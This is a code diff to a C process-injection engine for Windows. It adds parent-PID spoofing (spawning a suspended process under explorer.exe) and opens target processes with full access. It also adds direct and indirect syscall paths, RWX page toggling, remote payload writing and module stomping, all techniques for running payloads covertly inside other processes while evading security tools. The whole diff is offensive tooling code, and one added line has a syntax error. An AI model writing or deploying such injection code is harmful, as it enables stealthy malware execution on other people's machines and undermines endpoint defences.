@@ -2,7 +2,7 @@
 #include "..\includes\peb-eat-utils.h"
 #include "..\includes\syscall-utils.h"
 
-// Global variables required by indirect assembly stubs
+// Global variables required by your assembly stubs
 DWORD wNtAllocateVirtualMemorySSN = 0;
 UINT_PTR sysAddrNtAllocateVirtualMemory = 0;
 
@@ -18,14 +18,13 @@ UINT_PTR sysAddrNtCreateThreadEx = 0;
 DWORD wNtWaitForSingleObjectSSN = 0;
 UINT_PTR sysAddrNtWaitForSingleObject = 0;
 
-// init DFR
 P_VirtualAllocEx myVirtualAllocEx = NULL;
 P_WriteProcessMemory myWriteProcessMemory = NULL;
 P_VirtualProtectEx myVirtualProtectEx = NULL;
 P_CreateRemoteThread myCreateRemoteThread = NULL;
 P_WaitForSingleObject myWaitForSingleObject = NULL;
 
-// Resolve functions and SSNs
+// Resolve SSNs and Syscall offsets once at runtime
 BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
     if(flavor == FLAVOR_DFR) {
         // Obtain a handle to the kernel32.dll module, this will be passed to GetProcAddress
@@ -74,7 +73,7 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
             return FALSE;            
         }
     } else if(flavor == FLAVOR_INDIRECT) {
-        // Get the process PEB for resolving SSNs
+        // Get the LOCAL process PEB for resolving SSNs
         #if defined(_WIN64)
             PPEB pPeb = (PPEB)__readgsqword(0x60);
         #else
@@ -101,6 +100,56 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
         return TRUE;
     }
     return TRUE;
+}
+
+BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {    
+    if(ctx->spawnPath) {
+        // Setup PPID Spoofing
+        STARTUPINFOEXA si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        SIZE_T attributeSize = 0;
+
+        DWORD parentPid = FindPidByName(L"explorer.exe");
+        if (parentPid == 0) {
+            printf("[!] Failed to resolve explorer.exe PID.\n");
+            return FALSE;
+        }
+
+        HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+        if (!hParent) {
+            printf("[!] Failed to open Explorer handle: %d\n", GetLastError());
+            return FALSE;
+        }
+
+        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
+        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
+
+        if (!CreateProcessA(NULL, ctx->spawnPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
+            printf("[!] CreateProcess failed: %d\n", GetLastError());
+            return FALSE;
+        }
+
+        printf("[+] %s spawned (PID: %d) spoofing Explorer (%d)\n", ctx->spawnPath, pi.dwProcessId, parentPid);
+        ctx->hProcess = pi.hProcess;
+        return TRUE;      
+    } else {
+        printf("[*] Attempting to open the target process.\n");
+        HANDLE pHandle;
+        if(ctx->targetPid == 0){
+            printf("[*] No PID provided, targeting the current process.\n");
+            ctx->targetPid = GetCurrentProcessId();
+        }
+        // Open a handle to the target process
+        pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ctx->targetPid);
+        if (pHandle == NULL) {
+            printf("Failed to acquire process handle!\n");
+            return FALSE;
+        }
+        ctx->hProcess = pHandle;
+        return TRUE;
+    }
 }
 
 // --- ALLOCATION STRATEGY ---
@@ -171,63 +220,61 @@ BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProt
         NTSTATUS status = IndirectSysNtProtectVirtualMemory(ctx->hProcess, &baseAddr, &regionSize, targetProtect, &oldProt);
         if (pOldProtect) *pOldProtect = oldProt;
         return (status == 0);
-
-        /*
-        typedef NTSTATUS(NTAPI* FnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-        
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-        if (!hNtdll) return FALSE;
-
-        FnNtProtectVirtualMemory pNtProtect = (FnNtProtectVirtualMemory)GPAManualByName(hNtdll, "NtProtectVirtualMemory");
-        if (pNtProtect) {
-            ULONG oldProt = 0;
-            PVOID baseAddr = ctx->pRemoteAddress;
-            SIZE_T regionSize = ctx->payloadSize;
-            
-            NTSTATUS status = pNtProtect(ctx->hProcess, &baseAddr, &regionSize, targetProtect, &oldProt);
-            if (pOldProtect) *pOldProtect = oldProt;
-            return (status == 0);
-        }
-        */
     }
     return FALSE;
 }
 
 // --- WRITING STRATEGY ---
 BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
+    BOOL writeStatus = FALSE;    
     if (flavor == FLAVOR_WIN32) {
         printf("[*] Writing payload with WriteProcessMemory\n");
+        // WPM will toggle protection for us
+        // https://medium.com/@toneillcodes/the-single-primitive-write-writeprocessmemorys-hidden-page-flip-e5cb952bbfb2
         return WriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
     } 
     else if (flavor == FLAVOR_DFR) {
         printf("[*] Writing payload with WriteProcessMemory\n");
+        // WPM will toggle protection for us
+        // https://medium.com/@toneillcodes/the-single-primitive-write-writeprocessmemorys-hidden-page-flip-e5cb952bbfb2
         return myWriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
     }
-    else if (flavor == FLAVOR_DIRECT) {
-        // if we're doing module stomping with syscalls we need to toggle W permission
-        if(ctx->enableStomping) {
-            ULONG oldProt = 0;
-            printf("[*] Adding W permission to target buffer with direct syscall.\n");
-            DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor);
-        }
+    else if (flavor == FLAVOR_DIRECT) {       
+        // we really should check memory protection here and only toggle if needed
+        ULONG oldProt = 0;             
+        printf("[*] Adding W permission to target buffer with direct syscall.\n");
+        DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor);
+        
         printf("[*] Writing payload with SysNtWriteVirtualMemory.\n");
         SIZE_T bytesWritten = 0;
         NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, &bytesWritten);
-        return (status == 0);
+
+        if (status == 0) { // Assuming NT_SUCCESS
+            writeStatus = (bytesWritten > 0);
+        } else {
+            printf("Failed to write bytes!\n");
+            return FALSE;
+        }
+
+        // Restore original protections immediately
+        ULONG tempProt = 0;
+        printf("[*] Restoring original memory protections.\n");
+        DefaultProtect(ctx, oldProt, &tempProt, flavor);
+
+        return writeStatus;      
     } 
     else if (flavor == FLAVOR_INDIRECT) {
-        // if we're doing module stomping with syscalls we need to toggle W permission
-        BOOL writeStatus = FALSE;
-
+        // we really should check memory protection here and only toggle if needed
+        // if we're doing module stomping with syscalls we need to toggle W permission        
         if (ctx->enableStomping) {
             ULONG oldProt = 0;
             printf("[*] Adding W permission to target buffer with indirect syscall.\n");
             
-            // 1. Change to RWX
+            // Change to RWX
             if (DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor)) {
                 printf("[*] RWX toggle successful. Writing payload...\n");
                 
-                // 2. Write the payload while permissions are open
+                // Write the payload while permissions are open
                 SIZE_T bytesWritten = 0;
                 NTSTATUS status = IndirectSysNtWriteVirtualMemory(
                     ctx->hProcess, 
@@ -241,10 +288,12 @@ BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavo
                     writeStatus = (bytesWritten > 0);
                 }
 
-                // 3. RESTORE original protections immediately (e.g., back to RX or NOACCESS)
+                // Restore original protections immediately
                 ULONG tempProt = 0;
                 printf("[*] Restoring original memory protections.\n");
-                DefaultProtect(ctx, oldProt, &tempProt, flavor);
+                if(!DefaultProtect(ctx, oldProt, &tempProt, flavor)){
+                    printf("[!] Warning: Failed to revert memory protections")
+                }
             } else {
                 printf("[-] Error: Failed to change memory protections to RWX.\n");
             }
@@ -259,7 +308,7 @@ BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavo
         return writeStatus;
     } 
     
-    return FALSE;
+    return writeStatus;
 }
 
 // --- INVOCATION STRATEGY ---
@@ -342,6 +391,8 @@ BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
 BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor, DWORD finalProtect) {
     if (!engine->Allocate || !engine->Write || !engine->Protect || !engine->Invoke) return FALSE;
 
+    InitializeTarget(ctx, flavor);
+
     LPVOID pPeb = GetPebAddress(ctx->hProcess);
     
     if(flavor == FLAVOR_DFR || flavor == FLAVOR_INDIRECT) {
@@ -403,17 +454,18 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
         return FALSE;
     }
 
+    printf("[+] Payload staging complete.\n");
+    
     // no module stomping = toggle RX
     // module stomping + win32 or DFR doesn't require a toggle RX
     // module stomping + direct and indirect require a toggle to RX
-    if(ctx->enableStomping == FALSE) {
+    if(ctx->enableStomping == FALSE) {    
+        // raw allocation    
         printf("[+] Flipping page protection.\n");
         DWORD oldProtect = 0;
         if (!engine->Protect(ctx, PAGE_EXECUTE, &oldProtect, flavor)) return FALSE;
-        printf("[+] Page protections flipped to target execution permissions.\n");
-    }
-
-    printf("[+] Payload staging complete.\n");
+        printf("[+] Page protections flipped to RX.\n");        
+    } 
 
     // Execution of the payload
     if (!engine->Invoke(ctx, flavor)) return FALSE;
